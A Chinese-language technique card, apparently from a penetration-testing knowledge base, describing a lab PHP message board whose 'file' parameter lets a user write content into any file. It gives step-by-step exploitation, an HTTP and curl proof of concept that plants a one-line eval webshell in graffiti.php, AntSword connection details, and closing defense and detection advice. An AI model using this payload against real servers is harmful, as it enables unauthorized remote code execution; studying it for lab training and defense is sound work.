---
id: web-php-rce-message-board-file-param-arbitrary-write-webshell
title: 留言墙 file 参数决定写入文件：改 file=graffiti.php 把一句话木马写进可解析 PHP getshell
type: scenario
domain: web
path: web/php/rce
technique: user-controlled-target-file-message-write-webshell
aliases:
- 留言板 file 参数任意文件写入
- graffiti.php getshell
- 涂鸦墙写入 webshell
- message/file 双参数写马
- 页面回显注释化误导
tags:
- php
- arbitrary-file-write
- webshell
- file-param
- message-board
- getshell
- vulnhub
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V694
  verified_at: '2026-11-13T17:51:07+08:00'
  notes: 已对照原文与全部39图核对：图16/23抓包为 message=<?php @eval($_POST["cmd"]); ?>&file=graffiti.php，图17 graffiti.txt 中木马原样落盘（回显注释化仅为页面渲染层），图18 蚁剑连接 http://TARGET/graffiti.php、密码 cmd 连接成功，图19 为 www-data 与 /var/www/html 目录。自动创建不存在文件的说法来自原文陈述（无截图），script language=php 绕过尝试按原文记为未打通。原文未显式标记受影响版本，未设 affected_versions。frontmatter 无 sources/source_url。
---

## 一句话结论

PHP 留言墙 `graffiti.php` 把用户提交的 `message` 持久化到请求里另一个参数 `file` 指定的文件（默认 `graffiti.txt`）；把 `file` 改成 `graffiti.php`（或任意不存在的 `.php` 文件，程序会自动创建），`message` 填入一句话木马，访问该文件即被 PHP 解析，蚁剑可直接连接。页面回显时会把 `<?` 注释化，但这只是展示层处理，落盘内容仍是原始 message，不能据此判断写入被过滤。

## 原理

- **双参数写入模型**：表单抓包后可见 POST 体包含 `message`（留言内容）与 `file`（默认值 `graffiti.txt`）。服务端把 `message` 原样写入 `file` 指定的路径，`file` 完全由客户端控制且无白名单/路径校验，等价于“任意文件写入”原语。
- **为什么能 getshell**：写入目标在同一 Web 根目录下（`/var/www/html`），把目标改为 Web 可直接访问的 `.php` 文件后，PHP 模块会解析其中的 `<?php ... ?>`；请求该 URL 即执行 `eval($_POST["cmd"])`，攻击者拿到 Web 进程权限的命令执行。
- **自动建文件**：文章测试将 `file` 指向不存在的文件名时程序会自动创建，因此不需要预先存在可覆盖的 PHP 文件，直接新建 `shell.php` 也可落地。
- **回显过滤是伪装**：在页面源码里看到 `<?` 被插入 `<!--`、变成注释后，容易误判“木马被过滤”。但对照 `graffiti.txt` 的原始内容可见 `<?php @eval($_POST["cmd"]); ?>` 原样存在——注释化发生在前端回显/页面渲染环节，不是写入环节。真正决定利用成败的是“写进哪个文件、该文件是否被 PHP 解析”，而不是回显长什么样。
- **覆盖自身页面**：文章直接把木马写进 `graffiti.php` 覆盖原留言页，访问页面即触发，蚁剑连接成功（连接密码 `cmd`）。

## 触发条件

- Web 应用为 PHP，存在“把用户输入内容写入服务端文件”的功能（留言板、评论、涂鸦墙、缓存/日志写入等），且写入的文件名或路径来自请求参数。
- 写入目录位于 Web 根或可被 Web 访问/包含，写入的扩展名为 `.php` 等可解析类型。
- Web 进程对目标目录有写权限（文章环境中为 `/var/www/html`，属主 www-data）。

## 利用步骤

1. 在留言表单提交一条测试消息并抓包，确认请求体除 `message` 外还有控制落盘文件名的参数（本例 `file=graffiti.txt`）。
2. 访问 `graffiti.txt`（或页面回显处）确认消息被原样持久化，判断写入是否受内容过滤。
3. 将 `file` 改为同目录下已存在的 `.php` 文件（如 `graffiti.php`），`message` 填入 `<?php @eval($_POST["cmd"]); ?>` 重新提交。
4. 访问 `http://TARGET/graffiti.php`，用蚁剑/菜刀以密码 `cmd` 连接，得到 www-data 的 webshell。
5. 若不想破坏原页面，可把 `file` 指向不存在的 `shell.php` 等文件名，利用程序的自动建文件能力落地新木马。

## PoC

```http
POST /graffiti.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

message=<?php @eval($_POST["cmd"]); ?>&file=graffiti.php
```

```bash
# 等价的最小复现（注意 URL 编码）
curl -s "http://TARGET/graffiti.php" \
  --data-urlencode 'message=<?php @eval($_POST["cmd"]); ?>' \
  --data-urlencode 'file=graffiti.php'
```

连接：蚁剑添加 `http://TARGET/graffiti.php`，连接密码 `cmd`，编码 UTF-8。

## 变体与关联

- **存储型 XSS**：同一留言内容在页面中未转义输出，`<script>` 标签可原样渲染（文章用 devtools 确认），是该写入功能的附带问题；但主危害是任意文件写入 getshell。
- **PHP 旧式标签绕过尝试**：文章试过 `<script language="pHp">@eval(['a'])</script>` 形式规避 `<?` 被注释化，回显未被过滤但蚁剑未连接成功（PHP 7 起 `script language=php` 标签已移除），仅作尝试记录，未经证实。
- **同源场景**：各类“后台配置写入 PHP 文件”的任意文件写入（配置项/模板编辑/日志路径可控）与本卡机制一致——可控写入路径 + 内容含 PHP → Web 执行，如 [[web-php-rce-kitecms-template-fileedit-path-traversal-write-read]]、[[web-php-rce-zhicms-manage-set-siteconfig-write]]。
- **写后利用**：getshell 后可继续上传 Meterpreter 做本地提权，见 [[pentest-privilege-escalation-dirtypipe-cve-2022-0847-msf-root]]。

## 检测与防御

- **修复**：不要用客户端参数决定落盘路径；留言统一存数据库，或由服务端固定目录 + 随机文件名（如 UUID），并强制非可执行扩展名。
- **写入目录**：Web 根目录禁止运行时可写；数据目录用 `php_admin_flag engine off` / Nginx `location` 禁止 PHP 解析。
- **检测**：监控 Web 目录下 `.php` 文件的新增/内容变更（inotify、auditd、文件完整性监控）；访问日志中出现对同一新 `.php` 的首次访问后紧跟大量 POST（webshell 特征）；WAF 规则命中 `file=` 参数含 `../` 或 `.php`。
- **排查**：发现可疑留言/写入点时，比对 `graffiti.txt` 等数据文件与页面回显，确认是否存在“回显看似安全、落盘为原始内容”的差异。
